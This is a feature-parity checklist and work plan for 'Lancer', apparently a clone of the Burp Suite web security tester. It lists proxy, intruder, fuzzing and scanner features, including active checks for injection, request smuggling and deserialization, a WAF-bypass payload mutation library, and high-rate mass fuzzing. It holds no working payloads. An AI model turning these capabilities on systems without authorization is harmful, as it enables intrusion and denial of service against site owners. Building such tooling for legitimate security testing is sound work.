- ■ Prev / Next diff navigation (added this commit)
- ■ Soft wrap toggle (added this commit)
- ■ Sync scroll between input panes (added this commit)
- □ Add request / Add response from history (currently paste-only)
- □ Add file
- □ Search within diff
- □ Hex view of diff (binary safe)

### Logger
- ▣ Columns: #/Protocol/Host/Method/URL/Params/Status/Length/MIME/Time/Comment (Params and Comment displayed but mostly empty)
- □ Custom columns via Bambda
- □ Capture filter (what gets logged)
- □ View filter (what's displayed)
- □ Bambda mode
- □ Source-tool column (Proxy/Repeater/Intruder/Scanner)
- □ Right-click context menu (full Send-to-X set)
- □ Annotation per row
- □ Per-tool capture toggles

### Organizer
- □ Saved items table (NEW tab — missing entirely)
- □ Tags
- □ Notes (Markdown)
- □ Search
- □ Send to other tools
- □ Collections (Pro 2025.12 — encrypted share link)
- □ Import collection from link

### Settings → Sessions
- □ Cookie jar viewer / editor (table of host/name/value/expiry/secure/HttpOnly/SameSite)
- □ Empty entire jar
- □ Per-tool: jar update toggles (Proxy/Repeater/Intruder/Scanner/Sequencer/Extensions)
- □ Session Handling Rules editor (scope + ordered actions: check session, run macro, set cookie, set param, invoke extension, prompt user)
- □ Macros recorder (record from history, multi-request sequence, extract values to inject)
- □ Platform authentication credentials list (Basic/Digest/NTLM/Negotiate per host)

### Settings → Tools sub-categories
- □ Proxy options (already covered above)
- □ Repeater options (follow redirects / update cookies / update Content-Length / etc.)
- □ Intruder options (settings already enumerated)
- □ Scanner options (already enumerated)
- □ Logger options

### Settings → Display
- □ Theme: dark / light / system
- □ Font family / size
- □ HTTP message display (font, tab size, line wrap)
- □ Look and feel (compact / comfortable / spacious)

### Settings → Hotkeys
- □ ~100 customizable hotkeys (Burp lists every action). Lancer only has Ctrl+K palette.

### Settings → Memory
- □ Memory usage display
- □ Max heap size (Burp has JVM heap; Lancer doesn't need this — but a memory status would still be useful)

### Settings → Updates
- □ Check for updates button
- □ Auto-check on startup toggle
- □ Beta channel toggle

### Settings → Network
- □ Connections: Upstream HTTP proxy (host/port/auth)
- □ Connections: Upstream SOCKS proxy (host/port/auth)
- □ Connections: Per-host upstream rules table
- □ TLS: Trusted CAs list
- □ TLS: Client TLS certificates (per-host)
- □ TLS: Allow unsafe renegotiation
- □ TLS: Disable Java weak cipher restriction (N/A for Rust)
- □ DNS: Hostname resolution overrides table
- □ DNS: Search domain
- □ Platform authentication: Basic / Digest / NTLM / Negotiate per host
- □ Connection details: Connect timeout, response timeout, max bytes
- □ IP address resolution: Use any / IPv4 only / IPv6 only

### Settings → Project options
- □ HTTP: Redirects (per tool default)
- □ HTTP: Streaming responses (max size)
- □ TLS: trusted CAs / client certs / unsafe renegotiation
- □ Sessions: rules / jar / macros / platform auth
- □ Scope: use advanced control, include/exclude lists
- □ Out-of-scope requests: Drop / Forward / Forward without intercept
- □ Misc: SOCKS proxy / HTTP upstream
- □ Performance feedback toggle

### Extensions
- □ Installed tab (list with enable/disable/uninstall)
- □ BApp Store tab (search/filter/install)
- □ APIs tab (Montoya / Extender docs)
- □ Output log per extension
- □ Errors log per extension
- □ Per-extension hotkeys
- □ Per-extension Options sub-tab (custom-rendered)
- □ Reload extensions on file change (dev mode)

### Suite-wide
- □ Status bar at bottom: memory / project name / running scans count / extensions count
- □ File menu: New project / Open / Save / Save as / Export / Import / Recent (last 10) / Exit
- □ Edit menu: Undo / Redo / Cut / Copy / Paste / Find / Replace
- □ View menu: Layout (horizontal / vertical / detached) / Theme / Font size / Toolbar visible
- □ Help menu: Documentation / About / Check for updates / Report issue
- □ Toolbar with shortcut buttons (Ctrl+K palette / new project / etc.)
- □ Detachable / re-dockable panels
- □ Saved workspace layouts (named)
- □ Multi-monitor support (detach window onto second monitor)

### Engagement tools (right-click anywhere with a request)
- □ Search: regex across all responses
- □ Find comments: HTML/JS comments table
- □ Find scripts: every <script src=> URL extracted
- □ Find references: where this URL is referenced from in site map
- □ Analyze target: counts of URLs, params, cookies, static vs dynamic URLs
- □ Discover content: forced-browse with built-in wordlists, recursion depth
- □ Schedule task: cron expression to repeat scan/crawl
- □ Generate CSRF PoC: HTML form rendering the request
- □ ClickBandit: clickjacking iframe wrapper PoC
- □ Simulate manual testing: human-like browsing patterns

### Hotkey list to support (top priority)
- □ Ctrl+R — Send (Repeater)
- □ Ctrl+I — Send to Intruder
- □ Ctrl+E — Send to Repeater (from any tool)
- □ Ctrl+B — Send to Comparer (as request)
- □ Ctrl+Shift+B — Send to Comparer (as response)
- □ Ctrl+L — Send to Decoder
- □ Ctrl+Shift+L — Send to Sequencer
- □ Ctrl+S — Save project
- □ Ctrl+O — Open project
- □ Ctrl+N — New project
- □ Ctrl+T — New Repeater tab
- □ Ctrl+W — Close current tab
- □ Ctrl+Tab — Next tab
- □ Ctrl+Shift+Tab — Previous tab
- □ Ctrl+F — Find
- □ F2 — Rename tab
- □ Ctrl+K — Command palette (✓ done)

---

## WORK QUEUE — Burp 100% clone push (started 2026-05-24)

Goal: close the GUI gaps so every Burp Community feature has a working Lancer surface. Backend already covers ~90% of Burp + Pro; this work focuses on exposing it.

Sequenced batch (will commit at logical checkpoints, not after each tick):

### Batch 1 — Quick wins (no backend changes)
1. **Decoder full operations** — add hex / ASCII hex / octal / binary / GZIP / MD5 / SHA-1 / SHA-256 / SHA-384 / SHA-512 / SHA-3 buttons (12 new ops). Use Web Crypto API + DecompressionStream client-side.
2. **Comparer prev/next navigation** — buttons that scroll-jump between diff chunks, soft-wrap toggle.
3. **Repeater "Render response"** — sandboxed iframe button that previews response HTML.
4. **Theme toggle** — dark/light mode via CSS vars, persisted to localStorage.

### Batch 2 — Scope + cross-tool wiring
5. **Scope CRUD** UI in Target → Scope tab — full add / edit / delete / enable-toggle, via existing GET/PUT `/v1/scope`.
6. **Cross-tool Send to X** — Svelte store + right-click context menu actions in Proxy/Logger/Repeater so user can push a request into Intruder / Repeater / Comparer / Decoder / Scanner.

### Batch 3 — New tabs (backend → GUI)
7. **Cookie Jar tab** — list / edit / delete cookies. New `/v1/cookies` GET/POST/DELETE endpoint over `lancer-session/cookie_jar.rs`.
8. **Sessions tab** — Session Handling Rules + Macros editor over `lancer-session/rules.rs` + `lancer-session/macros.rs`. New `/v1/sessions/{rules,macros}` endpoints.
9. **Organizer tab** — saved items library. New `/v1/organizer` GET/POST/DELETE over `lancer-storage/organizer.rs`.
10. **WebSocket history** — populate the existing Proxy → WebSockets tab from new `/v1/ws-history` over `lancer-storage/websocket.rs`.
11. **Plugin manager tab** — list installed plugins per host, enable/disable. New `/v1/plugins` over `lancer-plugin/registry.rs`.

### Batch 4 — Settings persistence + status bar
12. **Settings persistence** — `PUT /v1/settings` endpoint that actually applies (proxy rebind, scanner threads, repeater redirect flag). Save button stops being a no-op.
13. **Status bar** — bottom strip with project name, memory usage, proxy address, plugin count, Burp-style.

### Batch 5 — Repeater + Inspector polish
14. **Inspector full editing** — make URL params / body params / cookies / headers editable form rows in Repeater Inspector.
15. **HTTP/2 frame editor toggle** in Repeater.
16. **Burp-AI buttons** in Repeater (Explain / Investigate / Find vulns) wired to `lancer-ai`.

### Batch 6 — Scanner depth
17. **Scanner preset selector** + per-check enable/disable.
18. **Configuration library** — save / load named scan configs, intruder configs.

### Batch 7 — Network + project lifecycle
19. **Network settings UI** — upstream HTTP/SOCKS, TLS pass-through, DNS overrides, platform auth.
20. **Project open/save/recent** dialog + recent projects list.

### Batch 8 — Beyond-Burp surfaces (Lancer-only)
21. **Mobile assistant panel** — Android ADB / iOS profile / Frida snippets.
22. **IaC parser panel** — drop a Dockerfile/Terraform, see attack surface.
23. **eBPF capture panel** (Linux-only) — start/stop kernel capture.
24. **Live collab panel** — peer list, project sharing.

### Batch 9 — Bug Bounty Hunter Extensions
25. **Nuclei-style template engine** — new `lancer-templates` crate, Scanner Templates sub-tab, `/v1/templates` API. Drop-in support for community nuclei-templates repo.
26. **Deep JS-rendering crawler mode** — extend `lancer-scanner/crawler.rs` with chromiumoxide-driven rendering. New crawl mode `deep_js`.
27. **Mass Fuzz attack type** — extend Intruder with high-speed async fuzzer + AI wordlist generator. New `lancer-fuzz` CLI binary sharing core library.
28. **JS Mining tab** — new `lancer-jsmining` crate. Passive analyzer on JS responses. New top-level GUI tab + `/v1/jsmining` API.
29. **Findings + AI Triage tab** — extend `lancer-report` with findings module. New top-level GUI tab + cross-tool "Save as Finding" right-click + AI report drafting.

Each batch ends with a commit + push. No mid-flight pauses (per autonomous-loop memory). After batch 8, re-audit and check what's left for "100% clone".

---

## Top GAPS to close for "true Burp parity"

Priority order — items most user-visible first:

1. **Settings persistence** — `Settings.svelte` "Save changes" button is a no-op. Bind address change doesn't actually rebind the proxy.
2. **Scope add/edit/delete** in Target → Scope tab. Backend (`Scope::add`, `PUT /v1/scope`) is ready.
3. **Cookie Jar viewer** + **Session Handling Rules** + **Macros** GUI tabs (or a Session sub-menu under Settings).
4. **Cross-tool "Send to X"** — wire up disabled context menu items in Proxy/Repeater (Send to Intruder, Sequencer, Comparer, Scanner).
5. **Decoder hex / octal / binary / GZIP / hash buttons** — backend exists; add 8 more buttons in `Decoder.svelte`.
6. **Inspector full editing** in Repeater — wire up URL params / body params / cookies / headers as editable form rows.
7. **Render response** in Repeater — sandboxed iframe HTML preview of response body.
8. **Plugin manager** GUI — list installed plugins per host (Rhai/WASM/Lua/Python/Native/JVM), enable/disable toggle, install-from-file.
9. **Bambda script editor** GUI for filters / custom columns / custom actions / match-replace / passive checks.
10. **WebSocket history** — real table populated from `lancer-storage/websocket.rs`.
11. **Network / Connections settings** GUI — upstream proxy, TLS pass-through, DNS overrides, platform auth.
12. **Project open / save / recent projects** — backend `Storage::open(path)` exists; need dialog + recent-files list.
13. **Configuration library** — save/load scan configs, intruder configs, session configs (backend has `ScanConfig`, etc.).
14. **Per-scan-check enable/disable** + Scanner preset selector (Lightweight/Balanced/Deep/etc.).
15. **Burp-AI-equivalent buttons** in Repeater ("Explain", "Investigate") wired to `lancer-ai`.
16. **Organizer** GUI tab — list saved items, tags, notes, search; "Save to Organizer" in right-click menus.
17. **Mobile assistant** GUI panel — Android ADB / iOS profile / Frida snippet copy.
18. **IaC parser** GUI — drop a Dockerfile/Terraform file, see surfaces.
19. **eBPF capture** GUI (Linux-only) — start/stop capture, view captured flows.
20. **Theme toggle** (dark/light) + hotkey customizer.
21. **Comparer prev/next + sync scroll** toggles.
22. **Repeater HTTP/2 frame editor**.
23. **Built-in browser** — replace "launch system browser" with an embedded Chromium that has the CA pre-installed.
24. **Collaborator server** — actual OAST server (DNS + HTTP + SMTP) and integration in Scanner + Intruder + Repeater right-click "insert Collaborator payload".
25. **DOM Invader runtime** — Chromium extension or wry-injected JS that instruments live DOM (current `lancer-dom` is static only).
26. **Render response toolbar** in Proxy history detail pane.
27. **Status bar / memory footer / extension count** in App.svelte.
28. **Detachable panels + saved workspace layouts**.
29. **Crash recovery** — auto-snapshot project every N minutes.
30. **Docker image + CI/CD examples** for headless mode.
31. **Nuclei-style template engine** — currently no template-based scanner. Most bug bounty workflows depend on Nuclei templates.
32. **Deep JS-rendering crawl mode** — current crawler is non-JS; SPAs ship 70%+ of endpoints in JS, all currently missed.
33. **Mass Fuzz mode** — Intruder is interactive-throttled; no ffuf-class mass fuzzing for content discovery.
34. **JS Mining passive analyzer** — JS files pass through proxy with no secret/endpoint extraction.
35. **Findings + AI Triage** — no cross-program finding management or AI-drafted reports.

## Confirmed WORKING end-to-end (verified this session, live tests)

These ran against real targets through the proxy / API; all returned expected results:

- HTTP/HTTPS forward proxy: 8 mixed-method requests captured with body, status, MIME, timings
- Match-and-replace rewrite of User-Agent header: server saw the rewritten value
- Scope `in_scope=true/false` flag flips per rule
- Intercept queue: toggle on → request paused → forward returns ok
- Repeater: real `GET /headers` + `POST /post` to httpbin.org, response captured, custom header echoed back
- Intruder Sniper: 4 payloads on `?id=§MARK§`, 4 distinct requests sent, payload reflection detected
- Active scanner: 11 issues against `http://httpbin.org/get` (XSS, SSRF, CORS, cache poisoning, SSTI, host-header injection)
- Passive scanner: 5 header-related findings against example.com
- Reports: HTML / JSON / Markdown / SARIF / XML all rendered with real content (26KB / 21KB / 9KB / 21KB / 14KB)
- CA cert PEM + DER export
- Decoder Base64 + URL encode (client-side)
- Comparer word + byte diff (client-side)
- Sequencer entropy analysis on 16 manually-loaded tokens
- Proxy auto-port-fallback when 8080 is in use by Burp → bound 8081
- Single-file `Lancer-Setup.exe` installer with desktop shortcut + icon

---

# PART A — CORE TOOLS

## 1. PROXY

### 1.1 Interception Engine
- [F] HTTP/1.0 and HTTP/1.1 intercepting proxy
- [F] HTTP/2 support (full normalization in editor + HTTP/2-only attack mode)
- [N] HTTP/3 (QUIC) support
- [F] HTTPS / TLS MITM with per-host certificate generation
- [F] WebSocket message interception (text + binary)
- [F] Server-Sent Events (SSE) handling
- [F] Manual intercept toggle (request / response separately)
- [F] Forward / Forward all / Drop / Drop all
- [F] Edit request and response in place before forwarding
- [F] Auto-modify response before browser sees it
- [F] Invisible proxying (transparent mode)
- [F] Listener bind to multiple ports / multiple interfaces
- [F] Open in Burp's browser (auto proxy + cert)
- [N] HTTP/3 / QUIC interception

### 1.2 HTTP History
- [F] Full request/response logging
- [F] Filter by host, method, status, MIME, scope, search term
- [F] Bambda (script) filters
- [F] Custom columns via Bambda
- [F] Color-coded highlights
- [F] Comments / annotations per item
- [F] Bulk select → delete / send to tool
- [F] Sort by any column
- [F] Send to Repeater / Intruder / Scanner / Comparer / Sequencer / Decoder / Organizer

### 1.3 WebSocket History
- [F] All sent/received messages logged
- [F] Filter by direction, type, host
- [F] Bambda filters
- [F] Send to Repeater / Comparer

### 1.4 Match & Replace Rules
- [F] Request header / body match/replace
- [F] Response header / body match/replace
- [F] First-request-line match/replace
- [F] Regex + literal modes
- [F] Per-rule enable/disable
- [F] Bambda-script-based rules
- [F] Rule testing UI
- [F] Import/export rule sets

### 1.5 Certificate Management
- [F] Auto-generate CA cert on first run
- [F] Install / export CA (DER + PEM)
- [F] X509v3 Key Usage extension (Python 3.13+ compatibility)
- [F] Authority Key Identifier + Subject Key Identifier extensions
- [F] Per-host cert caching
- [F] Custom CA import

### 1.6 Proxy Settings
- [F] TLS pass-through host list
- [F] Upstream proxy (HTTP / SOCKS4 / SOCKS5)
- [F] Per-host upstream proxy rules
- [F] Client TLS certificate authentication
- [F] Hostname resolution overrides
- [F] Platform authentication (NTLM / Negotiate / Basic / Digest)

---

## 2. TARGET

### 2.1 Site Map
- [F] URL view (hierarchical by domain → subdomain → path)
- [F] Crawl paths view
- [F] Method indicators (GET/POST/PUT/etc.)
- [F] Severity-circle indicators per branch
- [F] Black text = requested, gray = inferred
- [F] Consolidates: proxy traffic + crawls + manual adds + content discovery
- [F] Right-click context menu (send-to-tool, scope ops)
- [F] Filter by URL pattern, status, MIME, scope
- [F] Bambda filters
- [P] Compare site maps (track changes over time)
- [F] 304 responses don't overwrite stored response

### 2.2 Scope
- [F] Include / exclude rules
- [F] URL pattern matching (regex + simple)
- [F] Suite scope vs per-tool scope
- [F] Quick-add via command palette or right-click

### 2.3 Issues Pane (per host)
- [P] Burp Scanner findings displayed
- [P] Severity (Info/Low/Medium/High/Critical)
- [P] Confidence (Tentative/Firm/Certain)
- [P] Advisory text + remediation
- [P] Request/response evidence
- [P] Collaborator interactions inline
- [P] Manual severity/confidence override
- [P] Mark as false positive
- [P] Add manual issue

### 2.4 Engagement Tools (right-click on site map / message)
- [P] Search across all tools
- [P] Find comments (HTML/JS comments in responses)
- [P] Find scripts (extract all referenced script URLs)
- [P] Find references (locate where item is linked from)
- [P] Generate CSRF PoC (HTML form for the request)
- [P] ClickBandit — clickjacking PoC generator
- [P] Discover content (forced browsing + recursion)
- [P] Schedule task (cron-style)
- [P] Simulate manual testing (auto-browse with human-like patterns)
- [P] Target Analyzer (attack surface report, URL/param counts)

---

## 3. REPEATER

- [F] Send modified requests manually
- [F] Unlimited tabs
- [F] Tab grouping
- [F] Tab notes
- [F] Per-tab settings
- [F] Render response (HTML preview pane)
- [F] Side-by-side request/response view
- [F] History of sent requests per tab
- [F] Send group — fire multi-step sequence in order
- [F] Send to Comparer for diff
- [F] Update Content-Length automatically
- [F] Follow redirects toggle
- [F] Update cookies from cookie jar toggle
- [F] WebSocket message editor (text/binary, frame fields)
- [F] HTTP/2 frame-level editing
- [F] Change request method without retyping
- [F] Inspector pane (parsed parameters/headers — no raw editing needed)
- [P] Burp AI button: "explain", "find vulns", "what next", custom prompts
- [F] Custom Actions via Bambdas (extract, transform, automate)
- [F] Copy as pretty-printed JSON/XML
- [F] Hotkey: rename tab, switch sub-tabs

---

## 4. INTRUDER

### 4.1 Attack Types
- [F] Sniper — one payload set, iterates through positions one at a time
- [F] Battering Ram — one payload set, same payload to all positions
- [P] Pitchfork — multiple payload sets in parallel (one per position)
- [P] Cluster Bomb — cartesian product across multiple payload sets

(Community edition heavily throttles Intruder; Pro removes throttling.)

### 4.2 Payload Positions
- [F] Manual position markers
- [F] Auto positions on params/cookies/headers
- [F] Position in URL, body, headers, cookies, JSON keys, XML

### 4.3 Payload Set Types
- [F] Simple list
- [F] Runtime file (stream from disk for huge wordlists)
- [F] Custom iterator
- [F] Character substitution
- [F] Case modification
- [F] Recursive grep (use previous response data as next payload)
- [F] Illegal Unicode
- [F] Character blocks
- [F] Numbers (sequential / random, integer / float, custom step)
- [F] Dates
- [F] Brute forcer (charset × length)
- [F] Null payloads (send same request N times — for race conditions)
- [F] Character frobber
- [F] Bit flipper
- [F] Username generator (firstname/lastname combos)
- [F] ECB block shuffler
- [F] Built-in lists (XSS cheatsheet, fuzzing strings — auto-updated)
- [F] Extension-generated payloads

### 4.4 Payload Processing Rules (chained)
- [F] Add prefix / suffix
- [F] Match / replace (regex)
- [F] Substring / reverse substring
- [F] Modify case
- [F] Encode: URL / HTML / Base64 / ASCII hex / hex / octal / binary / gzip
- [F] Decode: all of the above
- [F] Hash: MD2, MD5, SHA-1, SHA-256, SHA-384, SHA-512, SHA-3
- [F] Add raw payload
- [F] Skip if matches regex
- [F] Invoke extension-defined processor

### 4.5 Attack Results
- [F] Columns: payload, status, length, time, comments
- [F] Grep — match (mark response containing string)
- [F] Grep — extract (extract value into column via regex/boundary)
- [F] Grep — payloads (response contained the payload — reflection check)
- [F] Status code / length / time anomaly highlighting
- [F] Filter results
- [F] Save/load attack
- [F] Resource pool (per-host concurrency limit)
- [F] Configurable retry on network failure
- [F] Throttle between requests
- [F] Ctrl+Click column copy

### 4.6 Mass Fuzz Mode `[N]` ✅ (batch-13)

**Implemented:** `lancer-tools/src/mass_fuzz.rs` — high-speed async fuzzer with `FUZZ`-marker URL templating, word×extension expansion, tokio-semaphore concurrency (1–256), ffuf-style match/filter sets (`-mc`/`-fc`/`-fs`), per-request status/size/word/line/time. API `POST /v1/massfuzz` + `GET /v1/massfuzz/wordlist` (bundled common list). New **Mass Fuzz** GUI tab (URL/method/wordlist/extensions/concurrency/filters + live-filterable results). Remaining vs full spec: standalone `lancer-fuzz` CLI binary, recursive discovery, SecLists bundle, AI wordlist gen, response calibration auto-baseline, streaming.


High-speed async fuzzer built into Intruder as a new attack type. New `lancer-tools/intruder/mass_fuzz` module. New `lancer-fuzz` CLI binary sharing the same library.

- [N] High-speed async HTTP fuzzer targeting 100k+ req/s on commodity hardware (vs Intruder's interactive cap)
- [N] ffuf-compatible command-line flags (`-w wordlist -u url -mc 200 -fs 1234`)
- [N] Auto-load wordlists from bundled SecLists (raft-large-directories, raft-large-words, etc.)
- [N] AI-generated target-specific wordlists via `lancer-ai` (input: target domain + tech stack → output: custom wordlist)
- [N] Recursive content discovery (auto-fuzz inside discovered directories)
- [N] Response calibration — sends 5 random non-existent paths, learns the baseline, auto-filters from there
- [N] Filter modes: status, size (bytes), words, lines, regex
- [N] Match modes: same fields
- [N] Multi-position fuzzing (cartesian, like ClusterBomb but at mass-fuzz speed)
- [N] WAF-bypass payload mutation library: header casing, parameter pollution, IP spoofing headers, encoding chains
- [N] Resume from checkpoint (saved attack state)
- [N] Streaming results to GUI as they arrive
- [N] Memory-mapped wordlist loading for huge files
- [N] Reuses `lancer-proxy` HTTP client (HTTP/2 multiplexing for free)
- [N] New "Mass Fuzz" radio button in Intruder alongside Sniper/BatteringRam/Pitchfork/ClusterBomb
- [N] New `lancer-fuzz` CLI binary (workspace member, shares `intruder-core` library crate)

---

## 5. SCANNER (Pro)

### 5.1 Crawling
- [P] Embedded Chromium crawler (handles JS-heavy SPAs)
- [P] Form auto-submission with smart values
- [P] CSRF token handling during crawl
- [P] Stateful navigation (login + cookies retained)
- [P] Application login replay (recorded sequences)
- [P] Scope-aware
- [P] Location fingerprinting (avoids redundant scans of "same" page)
- [P] Crawl strategy: Fast / Balanced / Deep / Coverage-focused

#### 5.1.1 Deep JS-Rendering Mode `[N]` ❌

Extends `lancer-scanner/crawler.rs` with a `js_render` module. Activated via `mode: "deep_js"` in `POST /v1/scan/crawl`. New "Deep JS Render" toggle + sub-options panel in Scanner GUI.

- [N] Headless Chromium via `chromiumoxide` (reuses §13 Built-in Browser engine)
- [N] Runs in authenticated context using current session jar (§17.1)
- [N] Captures every XHR / fetch / WebSocket initiated by client-side JS
- [N] SPA framework detection: React Router, Vue Router, Angular Router, Next.js, SvelteKit
- [N] Auto-triggers SPA route transitions (clicks router links, hash changes, history pushState)
- [N] Form auto-submission with smart values (email/phone/date inference per input type)
- [N] AJAX endpoint extraction → fed back into Scanner insertion points
- [N] GraphQL schema introspection during crawl
- [N] WebSocket endpoint discovery
- [N] Per-page screenshot stored in `lancer-storage`
- [N] "Feature graph" — DAG of which pages link to which (foundation for business-logic testing)
- [N] Idle detection (waits for network-idle before declaring page rendered)
- [N] DOM mutation observer (catches lazy-loaded routes)
- [N] Configurable depth, breadth, max pages
- [N] Reuses `lancer-dom` for sink detection during crawl

### 5.2 Active Scan Checks
- [P] SQL injection — error / boolean-blind / time-blind / union / out-of-band
- [P] NoSQL injection
- [P] OS command injection — synchronous + asynchronous (OAST)
- [P] Cross-site scripting — reflected / stored / DOM
- [P] Path traversal / LFI / RFI
- [P] Server-side request forgery (SSRF) — regular + blind (OAST)
- [P] XML external entity (XXE) — regular + blind
- [P] Server-side template injection (SSTI) — Twig/Jinja/Smarty/Velocity/Freemarker/ERB/etc.
- [P] LDAP injection
- [P] XPath injection
- [P] CRLF / header injection
- [P] Open redirect
- [P] HTTP host header injection
- [P] HTTP request smuggling / desync (CL.TE, TE.CL, TE.TE, HTTP/2 downgrade)
- [P] Web cache poisoning
- [P] Web cache deception
- [P] CORS misconfiguration
- [P] Clickjacking
- [P] Insecure deserialization (Java / .NET / PHP / Ruby / Python pickle)
- [P] Race conditions (single-packet attack)
- [P] Mass assignment
- [P] GraphQL — introspection enabled / injection / batching abuse
- [P] JWT — alg=none / weak HS secret / kid traversal / jku/jwk header tricks
- [P] OAuth / OIDC misconfiguration
- [P] Server-side prototype pollution
- [P] Subdomain takeover
- [P] React2Shell RCE (CVE-2025-55182 + CVE-2025-66478) — added 2025.11
- [P] Web LLM attacks (prompt injection, indirect prompt injection)

### 5.3 Passive Scan Checks
- [P] Missing/weak security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)
- [P] Cookie security flags (Secure / HttpOnly / SameSite)
- [P] Information disclosure (stack traces, internal IPs, paths, source maps, .git, .env, debug pages)
- [P] Mixed content
- [P] TLS configuration issues
- [P] Software version disclosure
- [P] Email / credit card / private key / API key leaks in responses
- [P] HTML/JS comments containing secrets
- [P] Vulnerable JS library detection
- [P] Form without CSRF token

### 5.4 Scan Configuration
- [P] Built-in configs: Lightweight / Balanced / Deep / Audit-only / Crawl-only / Audit-checks-passive-only / Audit-checks-OWASP-Top-10
- [P] Custom configurations (save/load)
- [P] Insertion point selection: URL params, body, headers, cookies, JSON, XML, multipart, path segments
- [P] Per-check enable/disable
- [P] Resource pool (concurrency per host)
- [P] Throttle / delay
- [P] Crawl strategy + audit strategy independent
- [P] Live audit (audit traffic flowing through proxy in real time)
- [P] Live passive crawl (just observe, no auditing)

### 5.5 API Scanning
- [P] OpenAPI 3.0 / 3.1 / 3.2 parsing
- [P] Postman collections
- [P] GraphQL endpoint scanning
- [P] OAuth2 Client Credentials flow (auto-detect from spec; auto-refresh token) — added 2025.12

### 5.6 Custom Scan Checks
- [P] BChecks — custom DSL for checks (no Java required)
- [P] BCheck library (community on GitHub)
- [P] Custom checks via Java/Montoya API
- [P] Custom passive scan check via Bambda
- [P] Per-project enable / disable custom checks

### 5.7 Nuclei-Style Template Engine `[N]` ❌

New `lancer-templates` crate. New Scanner → "Templates" sub-tab (`TemplateLibrary.svelte`). API: `GET/POST/PUT/DELETE /v1/templates`, `POST /v1/templates/run`, `POST /v1/templates/generate-from-request`.

- [N] YAML template engine fully compatible with ProjectDiscovery Nuclei v3 format
- [N] Drop-in support for the 9,000+ community nuclei-templates repo
- [N] Template categories: CVE, exposure, vulnerability, technology, misconfig, takeover, default-login
- [N] Severity tiers: info / low / medium / high / critical
- [N] DSL matchers: status / size / words / regex / binary / dsl
- [N] DSL helpers: `rand_base`, `md5`, `base64`, `hex_decode`, `url_encode`, datetime helpers
- [N] Workflow templates (chained multi-step checks)
- [N] Per-template rate limiting and concurrency
- [N] Auto-update from official nuclei-templates GitHub repo on startup (toggle)
- [N] In-app YAML template editor with syntax highlight + live validation
- [N] AI template generator — paste an HTTP request, get a generated template (uses `lancer-ai`)
- [N] Template performance dashboard (run count, average duration, hit rate, FP rate)
- [N] Private template library (your custom templates, never synced)
- [N] Run templates against current target via right-click in Proxy/Repeater
- [N] Integration with `lancer-scanner` so template hits become Issues in §2.3 Issues pane
- [N] Reuses `lancer-scanner/collaborator.rs` for OAST-aware templates

---

## 6. COLLABORATOR (Pro)

- [P] Out-of-band attack detection
- [P] Public collaborator server (hosted)
- [P] Self-hostable collaborator server (open source)
- [P] HTTP interaction detection
- [P] DNS interaction detection
- [P] SMTP interaction detection
- [P] Auto-polling every 60s
- [P] Manual "Poll now"
- [P] Unique payload generation per scan / per insertion
- [P] Toggle: include full Collaborator address vs ID-only
- [P] Use in Repeater (right-click → insert Collaborator payload)
- [P] Use in Intruder (payload type)
- [P] Use in custom BChecks
- [P] CSV export of interactions
- [P] Filter by protocol
- [P] Search interactions
- [P] Encrypted polling (no third-party can read your interactions)
- [P] Per-domain: `*.burpcollaborator.net`, `*.oastify.com`
- [P] Annotations on interactions

---

## 7. DOM INVADER (Pro)

- [P] Chromium browser extension
- [P] DOM XSS detection with source → sink tracing
- [P] Augmented DOM view (sinks highlighted)
- [P] Canary injection (configurable canary string)
- [P] Stack trace captured when sink reached
- [P] Web Message (`postMessage`) logging + modify + replay
- [P] Client-side prototype pollution source detection
- [P] Prototype pollution gadget scanning
- [P] DOM clobbering detection
- [P] Augmented DevTools panel
- [P] Attack type toggles (per check)

---

## 8. SEQUENCER

- [F] Token randomness analysis
- [F] Live capture (auto-collect tokens from a specified request)
- [F] Manual load tokens
- [F] Token extraction: regex / start-end boundaries
- [F] FIPS-140-2 statistical tests
- [F] Character-level analysis (each position independently)
- [F] Bit-level analysis
- [F] Entropy estimation
- [F] Save / reload token sample
- [F] Statistical tests: monobit, poker, runs, long runs, compression, character count, transition, etc.

---

## 9. DECODER

### Encode
- [F] URL, HTML, Base64, ASCII hex, hex, octal, binary
- [F] GZIP compress

### Decode
- [F] URL, HTML, Base64, ASCII hex, hex, octal, binary
- [F] GZIP decompress

### Hash
- [F] MD2, MD5, SHA-1, SHA-256, SHA-384, SHA-512
- [F] SHA-3 family

### Smart
- [F] Smart decode — auto-detect & recursively strip layered encodings

### Other
- [F] Chain transformations (output of one feeds input of next)
- [F] Multi-pane stacking

---

## 10. COMPARER

- [F] Word-level diff
- [F] Byte-level diff
- [F] Compare any 2 items (requests / responses / arbitrary text)
- [F] Sync scrolling (configurable on/off — added 2025.12)
- [F] Soft-wrap long lines (added 2025.12)
- [F] Persistent sync-view state between sessions
- [F] Previous / Next navigation between differences

---

## 11. ORGANIZER

- [F] Save interesting requests to library
- [F] Tag / categorize
- [F] Notes per saved item
- [F] Search saved items
- [P] **Collections** (2025.12): share group of requests via secure end-to-end-encrypted Burp link
- [P] Import collection via link or command palette

---

## 12. LOGGER

- [F] Real-time logging of every HTTP message generated by Burp (every tool + every extension)
- [F] Capture filter (what gets logged)
- [F] View filter (what's displayed)
- [F] Bambda-based filter scripts
- [F] Custom columns via Bambda
- [F] Task Logger (background tasks: scans, crawls)
- [F] Visibility into modified-by-session-handling-rules requests
- [F] Visibility into extension-generated requests
- [F] Annotation per row

---

## 13. BUILT-IN BROWSER

- [F] Embedded Chromium (kept current — was 143.x as of 2025.11)
- [F] Pre-configured to use Lancer proxy
- [F] CA certificate pre-installed (no warnings)
- [F] Isolated profile (no cross-contamination with system Chrome)
- [F] Auto-launch from Proxy → "Open Browser"

---

## 14. INSPECTOR

- [F] Parsed view of any request/response
- [F] Edit headers, params, cookies, body parts in form fields (no raw editing required)
- [F] Add/remove parameters with one click
- [F] URL params / body params / cookies / headers separate tabs

---

## 15. COMMAND PALETTE  *(added 2025.11)*

- [F] Ctrl+K / Cmd+K invocation
- [F] Fuzzy-match feature search
- [F] URL recognition: opens in browser / Repeater / scan / add to scope / exclude
- [F] Project-file search
- [F] BApp store browse
- [F] Extension invocation
- [F] Custom hotkey if Ctrl+K conflicts
- [F] Recent actions

---

## 16. BURP AI  *(Pro, 2025)*

- [P] Built into Repeater (button: "Explain", "Investigate", custom prompt)
- [P] AI-enhanced Scanner — Broken Access Control check (more accurate, fewer false positives)
- [P] AI-enhanced custom actions in Repeater
- [P] Vulnerability validation + exploit-suggestion assistance
- [P] Drafts report sections
- [P] 10,000 free credits for all Pro users
